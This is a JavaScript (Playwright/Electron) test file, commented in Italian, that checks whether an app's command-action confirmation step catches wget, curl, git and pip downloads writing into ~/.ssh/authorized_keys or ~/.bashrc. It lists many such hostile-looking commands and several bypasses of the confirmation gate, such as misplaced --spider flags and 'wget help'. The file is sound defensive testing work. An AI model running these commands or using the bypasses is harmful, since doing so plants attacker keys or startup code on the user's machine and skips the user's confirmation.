// #479 — verifica avversariale (giro 2). Il sintomo: scaricare un file dentro
// una cartella sensibile si fermava all'OK invece di chiedere di digitare
// "conferma". Il giro precedente aveva trovato la porta `--spider`.
//
// Qui: 1) i casi del segnalatore e le quattro porte del giro 1;
//      2) la caccia a porte nuove sulla stessa causa (il testo del comando
//         letto al posto dell'effetto);
//      3) la traccia visiva del popup (chiaro e scuro).

import { test, expect } from './fixtures/electron.mjs';
import { CONFIRM_HOST, confirmState } from './helpers/confirm.mjs';
import { mkdirSync } from 'node:fs';

const NEWTAB = 'filo://newtab/';
const SHOTS = 'tests/.shots';

const execAction = (app, action) =>
  app.evaluate((_e, { action }) => globalThis.SN_EXECUTE_FILO_ACTION(action), { action });

const cmd = (comando) => ({ type: 'ESEGUI_COMANDO', comando });

async function enableTerminal(page) {
  await page.evaluate(async () => chrome.runtime.sendMessage({
    type: 'filo_confirm_action',
    action: { type: 'IMPOSTA_PREFERENZA', chiave: 'terminale', valore: 'on' },
  }));
}

test('#479: le strade del segnalatore e le quattro porte del giro 1 chiedono tutte «conferma»', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  await enableTerminal(page);

  const devonoChiedereConferma = [
    // dal testo del segnalatore
    'wget -O /home/u/.bashrc http://esempio.test/x',
    'wget -P /home/u/.ssh http://esempio.test/x',
    'wget --directory-prefix=/home/u/.ssh http://esempio.test/x',
    'cd /home/u/.ssh && wget http://esempio.test/authorized_keys',
    'wget -c http://esempio.test/authorized_keys',
    'wget -N http://esempio.test/authorized_keys',
    // le quattro porte trovate al giro 1 (--spider esibito dove wget non lo applica)
    'wget -N -- http://esempio.test/authorized_keys --spider',
    'wget "http://esempio.test/authorized_keys" " --spider "',
    'wget "http://esempio.test/authorized_keys#  --spider "',
    'cd /home/u/.ssh && wget -N -- http://esempio.test/authorized_keys --spider',
    // e altre forme dello stesso gesto
    'wget --spider http://esempio.test/authorized_keys',
    'WGET http://esempio.test/authorized_keys',
    'wget -i /tmp/elenco-url',
    'wget --content-disposition http://esempio.test/x',
    'wget -q -O- http://esempio.test/x',
    // curl che fa atterrare qualcosa
    'curl -O http://esempio.test/authorized_keys',
    'curl -o /home/u/.ssh/authorized_keys http://esempio.test/x',
    'curl --output-dir /home/u/.ssh -O http://esempio.test/x',
    'curl -sLo /home/u/.bashrc http://esempio.test/x',
    'curl -D /home/u/.bashrc http://esempio.test/x',
    'curl -c /home/u/.bashrc http://esempio.test/x',
    'curl --etag-save /home/u/.bashrc http://esempio.test/x',
    'curl --hsts /home/u/.bashrc http://esempio.test/x',
    'curl --alt-svc /home/u/.bashrc http://esempio.test/x',
    'curl --libcurl /home/u/.bashrc http://esempio.test/x',
    'curl --stderr /home/u/.bashrc http://esempio.test/x',
    'curl --trace /home/u/.bashrc http://esempio.test/x',
    'curl -K /tmp/opzioni http://esempio.test/x',
    'curl -w "%output{/home/u/.bashrc}" http://esempio.test/x',
    // scrittura con la redirezione
    'curl http://esempio.test/x > /home/u/.ssh/authorized_keys',
    'curl http://esempio.test/x >> /home/u/.bashrc',
    'curl http://esempio.test/x | tee /home/u/.bashrc',
  ];

  for (const c of devonoChiedereConferma) {
    const r = await execAction(app, cmd(c));
    expect(r.executed, c).toBe(false);
    expect(r.needsConfirm, c).toBe(3);
  }

  // …e ciò che davvero non fa atterrare niente non è peggiorato: curl che
  // stampa a schermo resta all'OK, le letture di tutti i giorni restano dirette.
  const stampa = await execAction(app, cmd('curl -I http://esempio.test/x'));
  expect(stampa.needsConfirm).toBe(2);
  for (const lettura of ['ls', 'pwd', 'git status', 'cat note.txt', 'cd /tmp']) {
    const r = await execAction(app, cmd(lettura));
    expect(r.needsConfirm, lettura).toBeFalsy();
  }
});

// La cartella di lavoro non compare nel testo del comando: il popup deve dirla,
// altrimenti `wget http://x/authorized_keys` ha lo stesso identico testo nella
// home (innocuo) e dentro ~/.ssh (sovrascrive una chiave).
test('#479: il popup dice in quale cartella il file andrebbe a finire, e la cartella segue il cd', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  await enableTerminal(page);

  const scarica = cmd('wget http://esempio.test/authorized_keys');
  const prima = await execAction(app, scarica);
  const dove = (r) => (String(r.describe).match(/Cartella di lavoro: *(\S+)/) || [])[1];
  expect(dove(prima), 'il popup deve dire DOVE').toBeTruthy();

  await execAction(app, cmd('cd ..'));
  const dopo = await execAction(app, scarica);
  expect(dove(dopo)).toBeTruthy();
  expect(dove(dopo), 'la cartella mostrata segue il cd appena fatto').not.toBe(dove(prima));

  // Un cd verso una cartella inesistente non deve far MENTIRE il popup.
  await execAction(app, cmd('cd /cartella/che/non/esiste'));
  const dopoFallito = await execAction(app, scarica);
  expect(dove(dopoFallito), 'cd fallito → la cartella mostrata resta quella vera').toBe(dove(dopo));
});

// Traccia visiva: il box "digita conferma" con dentro il comando e la cartella.
test('#479: traccia visiva del box di conferma (chiaro e scuro)', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  await enableTerminal(page);
  const r = await execAction(app, cmd('wget http://esempio.test/authorized_keys'));
  const testo = String(r.describe);

  try { mkdirSync(SHOTS, { recursive: true }); } catch (_) {}

  for (const tema of ['light', 'dark']) {
    await page.emulateMedia({ colorScheme: tema });
    await page.evaluate((t) => {
      window.SN_CONFIRM_UI.confirmTyped({ title: 'Comando da terminale', text: t });
    }, testo);
    await expect(page.locator(CONFIRM_HOST)).toBeVisible();
    const s = await confirmState(page);
    expect(s.text, 'il comando e la cartella sono nel box').toContain('Cartella di lavoro');
    expect(s.okDisabled, 'il bottone parte bloccato').toBe(true);
    await page.screenshot({ path: `${SHOTS}/479-conferma-${tema}.png` });
    await page.keyboard.press('Escape');
    await expect(page.locator(CONFIRM_HOST)).toHaveCount(0);
  }
});

// ── rilievi residui (verifica 2026-09-03) ───────────────────────────────────
// test.fixme: repro VERIFICATE ROSSE oggi (senza `.fixme`). Sono la stessa
// causa del #479 — un'esenzione decisa leggendo il TESTO del comando, e
// l'invariante dichiarata («scaricare dalla rete facendo atterrare un file su
// disco è sempre livello 3») applicata al solo wget/curl. Chi lavora il fix
// toglie `.fixme`.

// `wget help` e `wget version`: wget legge quella parola come INDIRIZZO e
// scarica davvero (provato con wget vero contro un server locale: salva
// index.html nella cartella corrente, scelta prima con un `cd` che non chiede
// niente). Il classificatore le legge invece come una richiesta di aiuto/
// versione e le fa passare DIRETTE, senza nemmeno l'OK.
test.fixme('#479 — porta residua: wget con un operando che sembra «help»/«version» scarica senza chiedere niente', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  await enableTerminal(page);

  for (const c of ['wget help', 'wget version', 'wget -v version', 'wget -h help']) {
    const r = await execAction(app, cmd(c));
    expect(r.needsConfirm, `${c} dovrebbe chiedere conferma come ogni altro wget`).toBe(3);
  }
});

// Gli ALTRI programmi che scaricano dalla rete e fanno atterrare file restano
// al semplice OK. Provato davvero: un `git clone` da un server locale dentro
// una `~/.ssh` non ancora esistente fa atterrare l'authorized_keys scelto dal
// server. Alzarli ha però un costo d'attrito vero su comandi di tutti i giorni
// (`git clone`, `npm install`): è una scelta da owner, non un'ovvietà.
test.fixme('#479 — l\'invariante vale solo per wget/curl: gli altri scaricatori restano all\'OK', async ({ app, openTab }) => {
  const page = await openTab(NEWTAB);
  await enableTerminal(page);

  for (const c of [
    'git clone http://esempio.test/repo.git /home/u/.ssh',
    'git pull http://esempio.test/repo',
    'git fetch http://esempio.test/repo',
    'npm install http://esempio.test/pacchetto.tgz',
    'pip install http://esempio.test/pacchetto.tar.gz',
    // stessa classe dei --hsts/--alt-svc già alzati, ma non coperta
    // (curl ≥ 8.12): scrive il file indicato, troncando quello che c'era.
    'curl --ssl-sessions /home/u/.bashrc https://esempio.test/x',
  ]) {
    const r = await execAction(app, cmd(c));
    expect(r.needsConfirm, c).toBe(3);
  }
});
